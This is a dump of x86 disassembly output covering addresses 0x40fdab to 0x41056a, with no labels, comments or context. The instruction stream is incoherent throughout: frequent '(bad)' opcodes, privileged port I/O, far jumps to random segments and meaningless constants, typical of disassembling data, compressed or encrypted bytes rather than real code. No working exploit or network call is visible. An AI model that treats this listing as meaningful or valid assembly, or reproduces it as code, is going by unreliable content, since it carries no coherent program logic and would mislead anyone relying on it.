  40fdab:	xlat   BYTE PTR ds:[ebx]
  40fdac:	stos   BYTE PTR es:[edi],al
  40fdad:	and    eax,0xcc6084f3
  40fdb2:	(bad)  
  40fdb3:	fidivr DWORD PTR [edi-0x72]
  40fdb6:	repnz sbb edx,DWORD PTR [eax+0x1bc1a3e0]
  40fdbd:	inc    eax
  40fdbe:	ins    BYTE PTR es:[edi],dx
  40fdbf:	fsub   DWORD PTR [eax+0x71]
  40fdc2:	loope  0x40fd5c
  40fdc4:	fs addr16 hlt 
  40fdc7:	cmc    
  40fdc8:	outs   dx,BYTE PTR ds:[esi]
  40fdc9:	outs   dx,BYTE PTR ds:[esi]
  40fdca:	(bad)  
  40fdcb:	(bad)  
  40fdcc:	stos   DWORD PTR es:[edi],eax
  40fdcd:	jmp    0x274e:0x56d10820
  40fdd4:	xor    bl,BYTE PTR [ecx-0x6e]
  40fdd7:	mov    al,0x4a
  40fdd9:	mov    ebp,0x79f9e945
  40fdde:	pop    eax
  40fddf:	sub    eax,0x1ab1d622
  40fde4:	mov    eax,ds:0x5cc643b
  40fde9:	sbb    ebx,DWORD PTR ds:0x535bc63e
  40fdef:	fnstcw WORD PTR [esi-0x76188ef1]
  40fdf5:	sub    bl,BYTE PTR [ecx]
  40fdf7:	ucomiss xmm4,xmm2
  40fdfa:	call   0x9ee2b5ba
  40fdff:	dec    ebp
  40fe00:	cli    
  40fe01:	fidivr WORD PTR ds:0xbfd0af3b
  40fe07:	mov    dl,0xb3
  40fe09:	(bad)  
  40fe0a:	repnz push ebx
  40fe0c:	dec    ecx
  40fe0d:	or     eax,0xcc1765b1
  40fe12:	ret    0x952f
  40fe15:	and    ah,BYTE PTR [eax+0x2e7085a4]
  40fe1b:	scas   eax,DWORD PTR es:[edi]
  40fe1c:	sub    edi,DWORD PTR [ebp-0x22]
  40fe1f:	pop    edi
  40fe20:	cmp    dl,dh
  40fe22:	les    ecx,FWORD PTR [ebx]
  40fe24:	fwait
  40fe25:	(bad)  
  40fe26:	cld    
  40fe27:	sti    
  40fe28:	sub    al,0x13
  40fe2a:	(bad)  
  40fe2b:	push   esi
  40fe2c:	mov    al,ds:0x99046bee
  40fe31:	xor    BYTE PTR [esp+ebx*8],0x9f
  40fe35:	in     eax,0x35
  40fe37:	pop    esp
  40fe38:	xor    bl,BYTE PTR [eax+0x53]
  40fe3b:	adc    ebx,DWORD PTR [ebp+0x4e60a639]
  40fe41:	fnstcw WORD PTR [esi]
  40fe43:	fcomp  DWORD PTR [eax+0x70]
  40fe46:	pop    es
  40fe47:	popf   
  40fe48:	aad    0xcc
  40fe4a:	push   ebx
  40fe4b:	scas   eax,DWORD PTR es:[edi]
  40fe4c:	jle    0x40fea2
  40fe4e:	pop    ecx
  40fe4f:	fadd   st(7),st
  40fe51:	and    eax,0x89b8f99d
  40fe56:	loopne 0x40fed1
  40fe58:	clc    
  40fe59:	arpl   WORD PTR [esi+eax*2+0x629f69b1],cx
  40fe60:	nop
  40fe61:	or     DWORD PTR [edx+0x1e],ebp
  40fe64:	jbe    0x40fec2
  40fe66:	add    BYTE PTR [ebp+0x746eb9ce],0xd8
  40fe6d:	xlat   BYTE PTR ds:[ebx]
  40fe6e:	adc    eax,0x871c5350
  40fe73:	or     DWORD PTR [esi+0x53],0xffffff81
  40fe77:	out    0x3,al
  40fe79:	adc    edi,DWORD PTR [edi+0x788f29e5]
  40fe7f:	loopne 0x40fe44
  40fe81:	rol    BYTE PTR [ebp+0x5a],cl
  40fe84:	jp     0x40fe46
  40fe86:	lea    eax,[ebp+0x1d2f84af]
  40fe8c:	push   ds
  40fe8d:	lea    edi,[eax+0x25]
  40fe90:	xchg   esi,eax
  40fe91:	add    bh,0xea
  40fe94:	int    0x7d
  40fe96:	das    
  40fe97:	push   ecx
  40fe98:	xchg   ebx,eax
  40fe99:	sti    
  40fe9a:	mov    esi,0x12254032
  40fe9f:	lahf   
  40fea0:	xchg   edx,eax
  40fea1:	mov    ds:0xdcdbcde,al
  40fea6:	test   DWORD PTR [esi-0x36],edi
  40fea9:	sbb    BYTE PTR [edx],cl
  40feab:	dec    eax
  40feac:	retf   0x9804
  40feaf:	test   BYTE PTR [ebp+edx*1+0x6151b66c],bh
  40feb6:	scas   al,BYTE PTR es:[edi]
  40feb7:	mov    esp,0x9a3269d5
  40febc:	jnp    0x40feb1
  40febe:	push   edx
  40febf:	pop    esp
  40fec0:	adc    BYTE PTR [ebx-0x3a],bl
  40fec3:	adc    BYTE PTR [ecx],dl
  40fec5:	in     eax,dx
  40fec6:	mov    ?,WORD PTR [ebx]
  40fec8:	repz aas 
  40feca:	enter  0x33f7,0xc2
  40fece:	jg     0x40fe73
  40fed0:	out    0x51,eax
  40fed2:	in     al,0xa9
  40fed4:	dec    edi
  40fed5:	inc    esi
  40fed6:	pop    ebp
  40fed7:	push   edi
  40fed8:	nop    ebx
  40fedb:	xor    BYTE PTR [edi-0xd4861b8],ah
  40fee1:	inc    ebx
  40fee2:	jne    0x40ff1f
  40fee4:	lods   eax,DWORD PTR ds:[esi]
  40fee5:	or     BYTE PTR [eax+0x723ef111],bl
  40feeb:	mov    edx,0x3193ede8
  40fef0:	mov    dh,0xe
  40fef2:	dec    edi
  40fef3:	pop    ebp
  40fef4:	add    al,0x5b
  40fef6:	loop   0x40ff12
  40fef8:	les    ebp,FWORD PTR ss:[edi+eax*8-0x60]
  40fefd:	jp     0x40fea1
  40feff:	loop   0x40fea0
  40ff01:	push   ss
  40ff02:	enter  0x54c4,0x2d
  40ff06:	mov    ebp,0x78ea0d4a
  40ff0b:	inc    edx
  40ff0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff0d:	enter  0xc44c,0xa9
  40ff11:	push   es
  40ff12:	div    BYTE PTR [ecx+0x7c439dcd]
  40ff18:	add    BYTE PTR [ebx-0x54],ah
  40ff1b:	mov    WORD PTR [eax+0x4f],gs
  40ff1e:	dec    ebp
  40ff1f:	jnp    0x40ff68
  40ff21:	stc    
  40ff22:	rol    BYTE PTR [ebx-0x63a11f0],1
  40ff28:	jmp    0xe9033ca6
  40ff2d:	gs test al,0x75
  40ff30:	in     eax,0x39
  40ff32:	not    ecx
  40ff34:	popa   
  40ff35:	(bad)  
  40ff36:	in     eax,0x3
  40ff38:	sbb    BYTE PTR [edx],cl
  40ff3a:	cwde   
  40ff3b:	xor    edx,DWORD PTR [eax]
  40ff3d:	mov    ah,0x7f
  40ff3f:	sub    eax,0xc4b07f5
  40ff44:	loopne 0x40ff2f
  40ff46:	fnsave [edi+0x24d8eb75]
  40ff4c:	fsubrp st(4),st
  40ff4e:	sbb    ebx,esp
  40ff50:	xor    eax,0xf6b7df6e
  40ff55:	mov    ah,0x8c
  40ff57:	and    BYTE PTR cs:[ebp-0x653f302a],cl
  40ff5e:	ror    ebp,cl
  40ff60:	jl     0x40ff2f
  40ff62:	push   ecx
  40ff63:	aas    
  40ff64:	bound  ebp,QWORD PTR [eax-0x22]
  40ff67:	mov    edi,0x21d1a561
  40ff6c:	pop    ebp
  40ff6d:	cld    
  40ff6e:	fisubr WORD PTR [edx+ecx*8+0x71edf86a]
  40ff75:	jmp    esp
  40ff77:	loop   0x40ff8c
  40ff79:	dec    ebx
  40ff7a:	pushf  
  40ff7b:	jl     0x40ffa9
  40ff7d:	cmc    
  40ff7e:	out    0x4c,al
  40ff80:	ret    0x2ca4
  40ff83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff84:	jecxz  0x40ff19
  40ff86:	sub    al,0x76
  40ff88:	dec    edi
  40ff89:	test   eax,0x685bd197
  40ff8e:	mov    dh,0x80
  40ff90:	test   eax,0x744f5156
  40ff95:	and    dh,BYTE PTR [edi]
  40ff97:	jbe    0x40ffd8
  40ff99:	nop
  40ff9a:	fisubr DWORD PTR [ebx-0x56673caf]
  40ffa0:	jg     0x410011
  40ffa2:	adc    ebp,DWORD PTR [eax+0x3]
  40ffa5:	push   ecx
  40ffa6:	push   ebx
  40ffa7:	xchg   bh,ah
  40ffa9:	mov    BYTE PTR [ebp+0x47],0xf4
  40ffad:	repz aad 0x78
  40ffb0:	test   DWORD PTR [edi+edx*1+0x3a8ecfec],ebp
  40ffb7:	inc    edi
  40ffb8:	mov    dl,0xd0
  40ffba:	lods   al,BYTE PTR ds:[esi]
  40ffbb:	mov    ecx,0x82ff32b3
  40ffc0:	inc    esi
  40ffc1:	sbb    eax,0xd5d2b8f0
  40ffc6:	lock mov esp,0x61ba7ffc
  40ffcc:	xlat   BYTE PTR ds:[ebx]
  40ffcd:	push   0xffffffe7
  40ffcf:	inc    ebx
  40ffd0:	stc    
  40ffd1:	div    DWORD PTR ds:0x2cfe31c0
  40ffd8:	fs js  0x410026
  40ffdb:	in     al,dx
  40ffdc:	outs   dx,DWORD PTR ds:[esi]
  40ffdd:	dec    eax
  40ffde:	fwait
  40ffdf:	cli    
  40ffe0:	ret    0x4aac
  40ffe3:	sub    bh,BYTE PTR [ecx+0x2a8c25e0]
  40ffe9:	mov    esi,DWORD PTR [esi]
  40ffeb:	cmp    ebx,DWORD PTR [ecx]
  40ffed:	(bad)  [ecx+edi*4]
  40fff0:	cli    
  40fff1:	jno    0x40ffc6
  40fff3:	je     0x40fffb
  40fff5:	nop
  40fff6:	pusha  
  40fff7:	mov    al,0x76
  40fff9:	nop
  40fffa:	jge    0x40fff8
  40fffc:	jno    0x41004b
  40fffe:	pop    ds
  40ffff:	mov    ?,ebx
  410001:	mov    esp,0xccff5298
  410006:	jg     0x40ffc5
  410008:	in     al,0xcf
  41000a:	adc    DWORD PTR [eax],0xffffffe9
  41000d:	add    esp,eax
  41000f:	loope  0x410073
  410011:	xchg   esp,eax
  410012:	mov    ds:0x5a013e6f,al
  410017:	arpl   WORD PTR [edx+0x7f],si
  41001a:	in     eax,dx
  41001b:	out    0xd,al
  41001d:	xchg   edi,eax
  41001e:	aad    0x90
  410020:	add    ebp,esi
  410022:	in     al,0xd1
  410024:	and    edx,DWORD PTR [esi]
  410026:	aam    0x7
  410028:	jge    0x41007e
  41002a:	test   eax,0xaf6ed7e2
  41002f:	stos   BYTE PTR es:[edi],al
  410030:	inc    esp
  410031:	mov    ebp,0xe4183952
  410036:	ins    DWORD PTR es:[edi],dx
  410037:	leave  
  410038:	out    dx,eax
  410039:	nop
  41003a:	dec    DWORD PTR ds:0x69f81ef
  410040:	outs   dx,DWORD PTR ds:[esi]
  410041:	stos   DWORD PTR es:[edi],eax
  410042:	or     ebx,DWORD PTR [ebx+0x19]
  410045:	fsubr  DWORD PTR ds:0x7a281e8
  41004b:	mov    edi,0x30a79ac
  410050:	out    dx,al
  410051:	pop    es
  410052:	lds    esp,FWORD PTR [ebp-0x64e0d2b8]
  410058:	call   0x47c9646d
  41005d:	adc    ecx,DWORD PTR [ecx]
  41005f:	jl     0x41009d
  410061:	mov    esi,0x5549ea4
  410066:	dec    esi
  410067:	dec    esi
  410068:	xchg   ebp,eax
  410069:	xchg   edi,eax
  41006a:	push   ds
  41006b:	call   0x8881:0x7455b845
  410072:	in     eax,0x79
  410074:	pop    edi
  410075:	dec    ebx
  410076:	dec    ebx
  410077:	sub    al,0x46
  410079:	push   cs
  41007a:	lock daa 
  41007c:	retf   0x9d24
  41007f:	or     al,0xa1
  410081:	aaa    
  410082:	cld    
  410083:	mov    ebx,0x8e4b3747
  410088:	bound  edx,QWORD PTR [edx]
  41008a:	sub    al,0xa9
  41008c:	dec    edx
  41008d:	repnz push eax
  41008f:	mov    cs,WORD PTR [ebx+0x1a]
  410092:	call   0xcfe2a3f2
  410097:	mov    ebp,0x5af3a0bf
  41009c:	jge    0x4100d1
  41009e:	dec    ebp
  41009f:	mov    edx,0xf786380b
  4100a4:	push   edi
  4100a5:	fild   DWORD PTR [esi+edx*8+0x386d89a7]
  4100ac:	pop    ebp
  4100ad:	dec    esp
  4100ae:	inc    edi
  4100af:	fadd   DWORD PTR ds:0x6db445b6
  4100b5:	jge    0x410134
  4100b7:	cmp    bl,al
  4100b9:	mov    DWORD PTR ds:0x162f84f,esi
  4100bf:	out    dx,eax
  4100c0:	or     DWORD PTR [ebx+0x1a],ebx
  4100c3:	pusha  
  4100c4:	pop    ecx
  4100c5:	sub    ecx,DWORD PTR [ebx+esi*2]
  4100c8:	mov    edi,0x3a9ce16a
  4100cd:	(bad)  
  4100ce:	in     eax,0x24
  4100d0:	xchg   ebx,eax
  4100d1:	mov    al,BYTE PTR [ecx]
  4100d3:	jns    0x41009d
  4100d5:	sub    eax,0x768ee7ae
  4100da:	retf   
  4100db:	mov    esp,0x3d524b76
  4100e0:	adc    DWORD PTR [ecx],ebp
  4100e2:	cs adc al,0xb4
  4100e5:	push   ebp
  4100e6:	sbb    dl,BYTE PTR ds:0x12e8e3ef
  4100ec:	es pop ecx
  4100ee:	gs or  ah,0xbf
  4100f2:	aaa    
  4100f3:	shr    BYTE PTR ds:0xfc9d9bb,1
  4100f9:	and    dh,BYTE PTR [ebp-0x4b]
  4100fc:	retf   
  4100fd:	sbb    dl,BYTE PTR [eax-0x46a67ea1]
  410103:	xor    eax,0xead2e7e6
  410108:	sub    al,0xe7
  41010a:	mov    bl,0x43
  41010c:	pusha  
  41010d:	xchg   ecx,eax
  41010e:	jl     0x4100d0
  410110:	mov    ss,ebx
  410112:	stos   DWORD PTR es:[edi],eax
  410113:	dec    esp
  410114:	stc    
  410115:	iret   
  410116:	and    BYTE PTR [esi+0x6e],ah
  410119:	stos   DWORD PTR es:[edi],eax
  41011a:	fidiv  WORD PTR [ebp+ebx*4+0x3]
  41011e:	push   eax
  41011f:	mov    ebp,0x9cd300e2
  410124:	bound  esp,QWORD PTR [edi]
  410126:	mov    dl,BYTE PTR [ebx+0x5a]
  410129:	jmp    0x46cfdddc
  41012e:	js     0x410179
  410130:	mov    eax,ds:0x182ce2d5
  410135:	pop    esi
  410136:	xchg   edx,eax
  410137:	sahf   
  410138:	cwde   
  410139:	in     eax,0xc7
  41013b:	test   bh,0xf4
  41013e:	out    dx,al
  41013f:	imul   edi,DWORD PTR [ebp-0x121eec78],0x78
  410146:	pop    ecx
  410147:	cmc    
  410148:	cmp    al,BYTE PTR [esi-0x70]
  41014b:	pop    esi
  41014c:	and    bl,BYTE PTR ds:0x9f06b6ee
  410152:	jp     0x4101a1
  410154:	inc    ecx
  410155:	sbb    BYTE PTR [esi-0x54],ch
  410158:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41015a:	test   DWORD PTR [ecx],ebx
  41015c:	mov    ds:0x6bb4dcf0,al
  410161:	inc    ebp
  410162:	add    ecx,DWORD PTR [eax-0x54d19d04]
  410168:	mov    edx,edi
  41016a:	aas    
  41016b:	pop    DWORD PTR [edi+esi*4]
  41016e:	inc    ecx
  41016f:	sub    DWORD PTR [esi+0x21210f1c],edi
  410175:	sbb    ah,BYTE PTR [ebx-0x57]
  410178:	mov    cl,0x81
  41017a:	mul    BYTE PTR [ebx+0x6f]
  41017d:	mov    DWORD PTR ds:0x407b171d,0xf62a3de2
  410187:	out    0x72,al
  410189:	cmp    BYTE PTR [eax],dh
  41018b:	mov    dh,0xce
  41018d:	test   eax,0xb9c1f408
  410192:	lds    ebx,FWORD PTR [ecx+edi*8]
  410195:	adc    BYTE PTR [esi],0xaa
  410198:	pop    edi
  410199:	scas   eax,DWORD PTR es:[edi]
  41019a:	inc    ebp
  41019b:	cld    
  41019c:	fcom   DWORD PTR ds:0x6a4119ea
  4101a2:	mov    edi,0x2fa9581c
  4101a7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4101a9:	repnz cmp al,0xce
  4101ac:	add    BYTE PTR [eax+0x36],cl
  4101af:	pop    edi
  4101b0:	lock jg 0x4101ff
  4101b3:	push   cs
  4101b4:	iret   
  4101b5:	sub    esp,ebx
  4101b7:	mov    BYTE PTR [eax+0x5e3d9e5a],dh
  4101bd:	stc    
  4101be:	shl    BYTE PTR [esi+0x52],1
  4101c1:	in     al,0x4
  4101c3:	sub    eax,0x5e2141e0
  4101c8:	jo     0x41023c
  4101ca:	pop    ebx
  4101cb:	lods   al,BYTE PTR ds:[esi]
  4101cc:	out    dx,eax
  4101cd:	inc    ecx
  4101ce:	jns    0x410219
  4101d0:	(bad)  
  4101d1:	xchg   esp,eax
  4101d2:	mov    ebx,DWORD PTR [edx-0x27ec3bad]
  4101d8:	sub    BYTE PTR [ebx],dl
  4101da:	arpl   WORD PTR [edx-0x76],bx
  4101dd:	data16 jle 0x41021d
  4101e0:	inc    esp
  4101e1:	ss mov esi,0x2f45459f
  4101e7:	test   DWORD PTR [eax],ebx
  4101e9:	sub    al,0x6e
  4101eb:	inc    ebp
  4101ec:	scas   al,BYTE PTR es:[edi]
  4101ed:	bound  ebp,QWORD PTR [edi-0x3d5f41f]
  4101f3:	rcl    DWORD PTR ds:0x8c02338,0xb5
  4101fa:	xchg   ecx,eax
  4101fb:	sbb    eax,0x18cad4ad
  410200:	mov    bh,0x32
  410202:	sub    DWORD PTR [ecx+0x7],esp
  410205:	xchg   ah,cl
  410207:	test   BYTE PTR [edi-0x5d210ef4],cl
  41020d:	aad    0xd9
  41020f:	and    eax,esi
  410211:	cmc    
  410212:	pusha  
  410213:	outs   dx,BYTE PTR ds:[esi]
  410214:	push   ecx
  410215:	pop    ds
  410216:	call   0xdcf8:0x6760ea4b
  41021d:	in     eax,0xc2
  41021f:	adc    bh,BYTE PTR [edx-0x5343a757]
  410225:	push   cs
  410226:	cli    
  410227:	dec    edx
  410228:	push   cs
  410229:	mov    dh,0x15
  41022b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41022c:	ficomp WORD PTR [eax+ebx*8]
  41022f:	loopne 0x4101dc
  410231:	sbb    al,0x29
  410233:	xchg   edx,eax
  410234:	jbe    0x410279
  410236:	repnz add DWORD PTR [ecx+0x2d],esi
  41023a:	jae    0x4101dd
  41023c:	mov    edi,0xd617c986
  410241:	xlat   BYTE PTR ds:[ebx]
  410242:	int3   
  410243:	je     0x41027f
  410245:	xchg   esi,eax
  410246:	xor    al,0xec
  410248:	les    esi,FWORD PTR [ecx]
  41024a:	jbe    0x4101d2
  41024c:	or     DWORD PTR [esi+0x43196ccc],ebx
  410252:	or     al,0xa4
  410254:	in     al,0xbc
  410256:	test   al,0x61
  410258:	rol    DWORD PTR [ebp+0x1b],cl
  41025b:	cwde   
  41025c:	push   ebx
  41025d:	outs   dx,DWORD PTR ds:[esi]
  41025e:	dec    esp
  41025f:	mov    al,0x73
  410261:	jmp    0x4102b9
  410263:	inc    eax
  410264:	and    DWORD PTR [edx],eax
  410266:	out    dx,eax
  410267:	out    0x1d,al
  410269:	(bad)  
  41026a:	stc    
  41026b:	iret   
  41026c:	add    al,0x44
  41026e:	sub    ecx,esp
  410270:	mov    ebx,0x4eb442ba
  410275:	adc    BYTE PTR [edi-0x52],ah
  410278:	(bad)  
  41027a:	fdivrp st(5),st
  41027c:	retf   
  41027d:	das    
  41027e:	jns    0x4102fd
  410280:	mov    bh,0x7
  410282:	pop    edx
  410283:	(bad)  
  410284:	pop    ebp
  410285:	mov    ds:0x160c6744,al
  41028a:	jl     0x410224
  41028c:	jae    0x41023c
  41028e:	ins    DWORD PTR es:[edi],dx
  41028f:	jg     0x410301
  410291:	mov    edi,gs
  410293:	cmp    BYTE PTR [edx],bh
  410295:	cld    
  410296:	mov    al,ds:0x15d042fa
  41029b:	aas    
  41029c:	rol    BYTE PTR [edi+0x4c],0x59
  4102a0:	leave  
  4102a1:	daa    
  4102a2:	iret   
  4102a3:	loop   0x4102df
  4102a5:	outs   dx,DWORD PTR ds:[esi]
  4102a6:	and    bh,ch
  4102a8:	mov    gs,WORD PTR [edi]
  4102aa:	lods   al,BYTE PTR ds:[esi]
  4102ab:	ror    BYTE PTR [edx-0x78],1
  4102ae:	or     dh,BYTE PTR [edx-0x522fd72]
  4102b4:	jg     0x4102b5
  4102b6:	pop    ecx
  4102b7:	cmp    ebp,eax
  4102b9:	leave  
  4102ba:	sbb    eax,0x777382bd
  4102bf:	cmp    edi,DWORD PTR [ebx]
  4102c1:	les    ecx,FWORD PTR [ecx]
  4102c3:	or     esp,DWORD PTR ds:0xef33ef6d
  4102c9:	push   esi
  4102ca:	inc    ebp
  4102cb:	outs   dx,BYTE PTR ds:[esi]
  4102cc:	inc    ebx
  4102cd:	cwde   
  4102ce:	pop    ebp
  4102cf:	fmul   DWORD PTR [ebp+0x79]
  4102d2:	ss retf 
  4102d4:	pop    esp
  4102d5:	adc    DWORD PTR [ecx-0x3c65ada2],esi
  4102db:	clc    
  4102dc:	(bad)  
  4102dd:	cmp    dl,BYTE PTR [edx+0x38]
  4102e0:	xor    ebp,DWORD PTR fs:[ebx]
  4102e3:	sbb    al,BYTE PTR [edi]
  4102e5:	rol    DWORD PTR [edx+0x2e1ab000],0xf8
  4102ec:	idiv   bh
  4102ee:	push   eax
  4102ef:	pop    es
  4102f0:	mov    ecx,ecx
  4102f2:	push   ebp
  4102f3:	xchg   edx,eax
  4102f4:	pop    ss
  4102f5:	lds    edx,FWORD PTR [edx-0x65]
  4102f8:	(bad)  
  4102f9:	ins    DWORD PTR es:[edi],dx
  4102fa:	push   esp
  4102fb:	pushf  
  4102fc:	(bad)  
  4102fd:	push   0x82c81461
  410302:	jmp    0xcf27:0x6be52928
  410309:	sbb    DWORD PTR [ecx-0x5f],edx
  41030c:	aam    0xfd
  41030e:	push   ds
  41030f:	std    
  410310:	xor    edi,DWORD PTR [edx-0x4c99f1c7]
  410316:	(bad)  [ebx-0x1d111fe2]
  41031c:	mov    ebp,0xf06f02c9
  410321:	enter  0x28,0x8e
  410325:	in     eax,dx
  410326:	mov    ebx,0x3dc51ff4
  41032b:	inc    ebp
  41032c:	adc    BYTE PTR [ebp+0x59],bl
  41032f:	repz loopne 0x4103a5
  410332:	gs sbb dh,ch
  410335:	xchg   edx,eax
  410336:	jmp    0x2dca:0x6f1e
  41033c:	mov    edx,0x6bc2d1c6
  410341:	into   
  410342:	lock leave 
  410344:	mov    dl,0x1c
  410346:	jmp    0x2245:0xd8a5fbe5
  41034d:	lea    edx,[esi]
  41034f:	ficomp DWORD PTR [edi]
  410351:	push   0xce78d73
  410356:	jle    0x41037b
  410358:	mov    esi,0x89ab000f
  41035d:	mov    cl,0x13
  41035f:	das    
  410360:	inc    esp
  410361:	fcmovne st,st(6)
  410363:	aam    0xb5
  410365:	cmp    ecx,DWORD PTR [ecx+0x1848dfa3]
  41036b:	(bad)  
  41036d:	mov    ah,0x4a
  41036f:	mov    esi,0xcf936fcc
  410374:	sub    ebx,ecx
  410376:	mov    bh,0xa9
  410378:	inc    esi
  410379:	int3   
  41037a:	jg     0x41033a
  41037c:	stos   BYTE PTR es:[edi],al
  41037d:	cmp    ch,BYTE PTR [eax+0x2202925d]
  410383:	jbe    0x41034e
  410385:	mov    edi,0x4940534f
  41038a:	fst    DWORD PTR [edi]
  41038c:	cld    
  41038d:	mov    esp,0xcfc6dc14
  410392:	jl     0x41037b
  410394:	sbb    BYTE PTR [ebx+0x74],al
  410397:	sti    
  410398:	lods   al,BYTE PTR ds:[esi]
  410399:	loope  0x41038c
  41039b:	outs   dx,BYTE PTR ds:[esi]
  41039c:	aaa    
  41039d:	cmp    edi,DWORD PTR [ebp-0x79]
  4103a0:	inc    eax
  4103a1:	push   es
  4103a2:	push   edx
  4103a3:	shl    DWORD PTR [edx-0x3d],1
  4103a6:	sbb    BYTE PTR [ebp-0x65],0xca
  4103aa:	sub    ebp,DWORD PTR [ecx-0x7a403b63]
  4103b0:	std    
  4103b1:	or     DWORD PTR [ebx+0x2a],ebp
  4103b4:	or     dh,BYTE PTR [ebx+0x79f2a7e9]
  4103ba:	pop    edx
  4103bb:	push   ebp
  4103bc:	lods   eax,DWORD PTR ds:[esi]
  4103bd:	sbb    bl,bl
  4103bf:	daa    
  4103c0:	ret    
  4103c1:	sete   BYTE PTR [ebp-0x42]
  4103c5:	mov    ebx,0x4f738fd9
  4103ca:	or     ecx,DWORD PTR [ebx+0x9]
  4103cd:	out    0x68,eax
  4103cf:	sti    
  4103d0:	or     bh,cl
  4103d2:	je     0x4103ac
  4103d4:	and    al,0x40
  4103d6:	sub    eax,0xe8afc3
  4103db:	sahf   
  4103dc:	shl    BYTE PTR [ebx-0xc5bcf26],1
  4103e2:	enter  0xd9e2,0xcd
  4103e6:	lock xchg ebp,eax
  4103e8:	inc    edx
  4103e9:	inc    edx
  4103ea:	js     0x41041c
  4103ec:	cmp    ecx,DWORD PTR [ebp-0x6ff4feb8]
  4103f2:	(bad)  
  4103f3:	cld    
  4103f4:	sub    eax,0x9d219f4b
  4103f9:	push   esp
  4103fa:	xor    al,0x75
  4103fc:	int3   
  4103fd:	jnp    0x4103fe
  4103ff:	repz lahf 
  410401:	inc    esp
  410402:	dec    edx
  410403:	leave  
  410404:	inc    edi
  410405:	adc    eax,0x3d237be2
  41040a:	iret   
  41040b:	sub    DWORD PTR [edx+0x8aa6b8f],0x56
  410412:	mov    ?,ebp
  410414:	jno    0x410470
  410416:	rcr    DWORD PTR [ebp+0x646ec80f],1
  41041c:	mov    dl,0x3c
  41041e:	into   
  41041f:	imul   eax,DWORD PTR [esi+0x6f],0xffffffd4
  410423:	nop
  410424:	leave  
  410425:	or     esi,0xfa361009
  41042b:	or     ch,ch
  41042d:	pop    eax
  41042e:	xchg   BYTE PTR [edx+0x119ecb2c],dh
  410434:	mov    edi,DWORD PTR [edi-0x42]
  410437:	jae    0x410441
  410439:	mov    ah,0xc7
  41043b:	popa   
  41043c:	dec    ebx
  41043d:	into   
  41043e:	lock dec esp
  410440:	mov    al,ds:0x90b1734b
  410445:	gs hlt 
  410447:	dec    ebx
  410448:	or     edi,DWORD PTR [edi-0x5ad98cbd]
  41044e:	push   ss
  41044f:	(bad)  
  410451:	retf   0xd4c9
  410454:	sahf   
  410455:	and    BYTE PTR ds:0x4a539320,dl
  41045b:	pushf  
  41045c:	test   BYTE PTR [esi-0x68],0x54
  410460:	inc    ebp
  410461:	cdq    
  410462:	mov    WORD PTR [edx+0x263ca8db],?
  410468:	in     al,dx
  410469:	pop    ecx
  41046a:	jmp    0xb5b23305
  41046f:	mov    bh,0x43
  410471:	cld    
  410472:	ins    DWORD PTR es:[edi],dx
  410473:	ja     0x410471
  410475:	inc    eax
  410476:	aas    
  410477:	jmp    0x410417
  410479:	pop    esp
  41047a:	inc    edi
  41047b:	mov    esi,0x4fd012e8
  410480:	adc    BYTE PTR [eax-0x1],dh
  410483:	pop    esp
  410484:	add    eax,0xc6c88ba3
  410489:	jb     0x410460
  41048b:	sub    edx,DWORD PTR [ebp-0x1ca8f625]
  410491:	imul   esi,DWORD PTR [edi+edx*1-0x27c87120],0x6c
  410499:	jmp    0x17f8d26
  41049e:	xchg   esp,eax
  41049f:	call   0x6ab:0x1634744c
  4104a6:	(bad)  
  4104a8:	out    0x75,eax
  4104aa:	aam    0xab
  4104ac:	xlat   BYTE PTR ds:[ebx]
  4104ad:	sbb    ah,BYTE PTR [eax+ebp*1-0x6d]
  4104b1:	adc    BYTE PTR [ecx-0xa],bh
  4104b4:	pop    ebx
  4104b5:	mov    edi,0x19558aa7
  4104ba:	fiadd  WORD PTR [eax+0x4eb6d5e0]
  4104c0:	cmp    DWORD PTR [ecx+eax*1],ebx
  4104c3:	(bad)  
  4104c5:	sahf   
  4104c6:	jl     0x4104fe
  4104c8:	cmp    BYTE PTR [edx-0x6f9656b3],0xd
  4104cf:	jne    0x41050a
  4104d1:	sub    eax,0x686f78ba
  4104d6:	add    cl,BYTE PTR [edx]
  4104d8:	mov    eax,0xfa8d8cda
  4104dd:	arpl   WORD PTR [eax],ax
  4104df:	aaa    
  4104e0:	pop    ds
  4104e1:	pop    DWORD PTR [edi]
  4104e3:	scas   al,BYTE PTR es:[edi]
  4104e4:	xlat   BYTE PTR ds:[ebx]
  4104e5:	pop    ss
  4104e6:	xor    eax,0x3fd03d57
  4104eb:	mov    al,ds:0xb6dc149a
  4104f0:	xor    dh,BYTE PTR [eax+0x5b]
  4104f3:	add    ebp,ecx
  4104f5:	leave  
  4104f6:	faddp  st(2),st
  4104f8:	or     al,0x7c
  4104fb:	and    bh,BYTE PTR [edx+0x54]
  4104fe:	call   0xe4a96063
  410503:	fdiv   st,st(5)
  410505:	xchg   edi,eax
  410506:	repnz fstp QWORD PTR [ecx]
  410509:	inc    edx
  41050a:	or     DWORD PTR [eax],esi
  41050c:	pushf  
  41050d:	xor    esp,DWORD PTR [eax-0x71]
  410510:	test   BYTE PTR [edx],0xb
  410513:	pusha  
  410514:	rol    DWORD PTR [ebp+0x67],1
  410517:	in     al,0xb6
  410519:	int    0x10
  41051b:	mov    esp,0x7e46e0e5
  410520:	popa   
  410521:	xor    DWORD PTR [ecx-0x6f8b57d5],edi
  410527:	or     ecx,DWORD PTR [edx-0x54]
  41052a:	add    al,0x82
  41052c:	popf   
  41052d:	aaa    
  41052e:	in     al,dx
  41052f:	inc    esp
  410530:	repnz adc eax,0xd7bb3986
  410536:	mov    eax,ds:0xb614d87f
  41053b:	repz pop edx
  41053d:	out    dx,al
  41053e:	mov    esp,DWORD PTR ss:[eax-0x66c28ff3]
  410545:	sbb    ecx,DWORD PTR [ebp+0x53]
  410548:	ins    BYTE PTR es:[edi],dx
  410549:	lock mov eax,ds:0xe2a06882
  41054f:	loopne 0x4105cf
  410551:	or     al,0x9c
  410553:	rcl    dl,cl
  410555:	pushf  
  410556:	mov    ds:0xaa9bb5c8,al
  41055b:	push   ebp
  41055c:	call   0x237822ce
  410561:	dec    esp
  410562:	add    al,0x26
  410564:	and    ah,BYTE PTR [eax-0x3f450e3e]
  41056a:	shr    BYTE PTR [ebp-0x2585a30f],0x1a
